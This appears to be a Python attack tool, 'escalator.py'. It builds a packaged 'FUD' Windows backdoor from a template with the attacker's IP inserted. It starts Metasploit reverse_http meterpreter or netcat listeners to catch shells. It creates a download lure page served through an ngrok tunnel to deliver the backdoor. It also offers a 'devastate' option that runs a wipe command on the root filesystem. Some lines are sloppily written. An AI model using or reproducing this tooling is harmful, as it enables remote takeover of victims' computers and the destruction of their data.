# Codded by predator0x300
import sys
import subprocess
import os
from time import sleep
import re
import shutil
import threading

usage = ("""Usage: \033[93mpython3 escalator.py <exploit_type> 
Types:
    Exploits: exploit_windows, linuxp, tunnel, exploit_linux
Function: 
    exploit_windows: Create FUD & start listener
    linuxp: For privilege escalation & Devastation
    tunnel: Deliver the backdoor through a LINK
    exploit_linux: Devastate LINUX OS COMPLETELY\033[00m""")

def cc_card_holder(holder):

    for card in holder:
        sys.stdout.write(card)
        sleep(.008)
        threading.Thread()


#print(usage)
def banner():
    os.system("clear")
    print('''\033[31m
    ▓█████   ██████  ▄████▄   ▄▄▄       ██▓    ▄▄▄     ▄▄▄█████▓ ▒█████   ██▀███  
    ▓█   ▀ ▒██    ▒ ▒██▀ ▀█  ▒████▄    ▓██▒   ▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒
    ▒███   ░ ▓██▄   ▒▓█    ▄ ▒██  ▀█▄  ▒██░   ▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒
    ▒▓█  ▄   ▒   ██▒▒▓▓▄ ▄██▒░██▄▄▄▄██ ▒██░   ░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄  
    ░▒████▒▒██████▒▒▒ ▓███▀ ░ ▓█   ▓██▒░██████▒▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒
    ░░ ▒░ ░▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒░▓  ░▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
     ░ ░  ░░ ░▒  ░ ░  ░  ▒     ▒   ▒▒ ░░ ░ ▒  ░ ▒   ▒▒ ░   ░      ░ ▒ ▒░   ░▒ ░ ▒░
       ░   ░  ░  ░  ░          ░   ▒     ░ ░    ░   ▒    ░      ░ ░ ░ ▒    ░░   ░ 
       ░  ░      ░  ░ ░            ░  ░    ░  ░     ░  ░            ░ ░     ░     
                    ░                                                             
    \033[00m            \033[01m\033[33m         >>> cOdEd By: Predator0x300 <<<\033[00m\033[00m\n''')

def Ngrok():
    print("\033[1m\033[36m")
    os.system("ls")
    print("")
    name1=input("\n\033[32mEnter the file (auto WAN executable download link): \033[00m")
    port0= input("\033[32mEnter the port to forward: \033[00m")
    print("\033[33mCreating TUNNEL WEB_PAGE...\033[00m")


    def index_defaultNgrok():
        cc_card_holder('''\033[31m <!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<!-- AngelSecurityTeam -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
.btn {
  background-color: DodgerBlue;
  border: none;
  color: white;
  padding: 12px 30px;
  cursor: pointer;
  font-size: 20px;
}
.btn:hover {
  background-color: RoyalBlue;
}
</style>	
<title></title>
<script src="http://code.jquery.com/jquery-3.2.1.min.js"></script>
</head>
<body>
<div class="wrapper">
<center>
<!-- AngelSecurityTeam -->
<input type="submit" class="btn" style="width:40%" class="fa fa-download" class="BotonDown" value="Download" onclick="document.location.href='"""+name1+"""' ">
</center>
</a>
</div>
</body>
</html> \033[00m''')
        with open("index.html", "w") as file:
            file.write("""
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<!-- AngelSecurityTeam -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
.btn {
  background-color: DodgerBlue;
  border: none;
  color: white;
  padding: 12px 30px;
  cursor: pointer;
  font-size: 20px;
}
.btn:hover {
  background-color: RoyalBlue;
}
</style>	
<title></title>
<script src="http://code.jquery.com/jquery-3.2.1.min.js"></script>
</head>
<body>
<div class="wrapper">
<center>
<!-- AngelSecurityTeam -->
<input type="submit" class="btn" style="width:40%" class="fa fa-download" class="BotonDown" value="Download" onclick="document.location.href='"""+name1+"""' ">
</center>
</a>
</div>
</body>
</html> 
          """)

    index_defaultNgrok()
    #http.server 80
    os.system("python3 -m http.server 80 > .server 2> /dev/null &")
    os.system("chmod +x ngrok")
    #http.server 80 NGROK
    portN= port0
    os.system("./ngrok http {} > /dev/null &".format(portN))
    sleep(8)
    os.system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z]*\.ngrok.io" -oh > link2.url')
    urlFile = open('link2.url', 'r')
    url = urlFile.read()
    urlFile.close()
    if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
      print("\n\033[1m\033[36mGenerated Link: \033[1m\033[0m"+url)

    exit()
def devastate():
    destroy = input("\033[01m\033[31mARE YOU SURE YOU WANNA HAULT THIS CURRENT OS?(0/1): \033[00m\033[00m")
    if(destroy == "1"):
        os.system("rm rf /*")
    else:
        exit()

def msfconsole(host1):
    payload1= "python/meterpreter/reverse_http"
    port1 = 8080
    datamsf = ("use exploit/multi/handler;set PAYLOAD "+payload1+";set LHOST "+str(host1)+";set LPORT "+str(port1)+";run")
    subprocess.call(["msfconsole", "-q" ,"-x", datamsf])

def win_payload():
    host_ip = input("\033[33mEnter the Host_ip: \033[00m")
    print("\033[31m----------\033[00m") 
    try:
        shutil.copy("original_base.txt", "backdoor.py")
    except:
        print("\033[32mPayload Doesn't Exists!\033[00m")

    with open('backdoor.py', 'r') as file:
        filedata = file.read()

    # Replace the target string
        filedata = filedata.replace('predator', host_ip)

    # Write the file out again
        with open('backdoor.py', 'w') as file:
            file.write(filedata)
    subprocess.call(['pyinstaller backdoor.py'],shell=True)
    os.remove("backdoor.py")
    print("\033[31m----------\033[00m") 
    print("\033[33mFUD Payload: saved in Dist\033[00m")
    ngrok1 = input("\033[34mDo You want port forwarding? (LINK, y/n): \033[00m")
    if(ngrok1 == "y"):
        Ngrok()
        print("\033[31m----------\033[00m") 
        print("\033[31mFor meterpreter shell: 1\033[00m")
        print("\033[31mFor netcat shell: 2\033[00m")
        session = input("Which session do you want?: ")
        if(session == "1"):
            msfconsole(host_ip)
        elif(session == "2"):
            os.system("nc -lvp 8080")
        else:
            exit()
    elif(ngrok1 == "n"):
        print("\033[31m----------\033[00m") 
        print("\033[31mFor meterpreter shell: 1\033[00m")
        print("\033[31mFor netcat shell: 2\033[00m")
        session = input("Which session do you want?: ")
        if(session == "1"):
            msfconsole(host_ip)
        elif(session == "2"):
            os.system("nc -lvp 8080")
        else:
            exit()

def exploit_linux():
    #print("linux_exploit")
    listener = input("\033[31mDo you wanna start the listener?(0/1): \033[00m")
    port10 = input("Specify the port number: ")
    if (listener == "1"):
        print("\033[31mStarting netcat...\033[00m")
        sleep(0.7)
        print("\033[04mTo get the PID execute: cat /proc/net/netlink\033[00m")
        print("\033[04mTo Run Privilege_Escalation Exploit: ./exploit <PID>\033[00m")
        subprocess.call(['nc -lvp '+str(port10)])
    else:
        exit()

if (len(sys.argv) == 2):
    if(sys.argv[1] == "exploit_windows"):
        banner()
        #Ngrok()
        win_payload()
    elif(sys.argv[1]=="linuxp"):
        banner()
        exploit_linux()
    elif(sys.argv[1] == "tunnel"):
        banner()
        
        print("\033[31mCurrent Working dir: \033[00m")
        current_dir = subprocess.call(['pwd'], shell=True)
        print("\033[31m----------\033[00m") 
        print("\033[31mSelect the file to Create a WAN LINK: \033[00m")
       
        #print("\033[31mThe current working dir is: {}\033[00m".format(current_dir))
        Ngrok()
    elif(sys.argv[1] == "exploit_linux"):
        banner()
        devastate()
    else:
        banner()
        print(usage)
else:
    banner()
    print(usage)
